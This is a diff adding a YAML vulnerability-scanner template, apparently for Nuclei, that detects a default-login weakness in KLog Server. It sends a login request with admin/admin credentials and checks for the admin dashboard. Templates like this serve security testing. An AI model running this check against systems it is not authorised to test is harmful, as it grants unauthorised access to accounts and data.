@@ -1,0 +1,46 @@
+id: klog-server-default-login
+
+info:
+  name: KLog Server - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    KLog Server contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://www.klogserver.com/
+  metadata:
+    max-request: 2
+    vendor: klogserver
+    product: klog_server
+  tags: default-login,klog-server
+
+http:
+  - raw:
+      - |
+        POST /actions/entree.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&pswd={{password}}&action=login
+
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    host-redirects: true
+    max-redirects: 3
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "<title>KLog Server", "ADMIN", "Dashboard")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4b0a00483046022100e1834e37da78bec3ac420b56e137127fcca01fdb51d2351004b27416368a3e21022100a80106190b2dfa9aa45122c35466110b56226edb0ccfc9c034d634fc9f73064f:922c64590222798bb761d5b6d8e72950
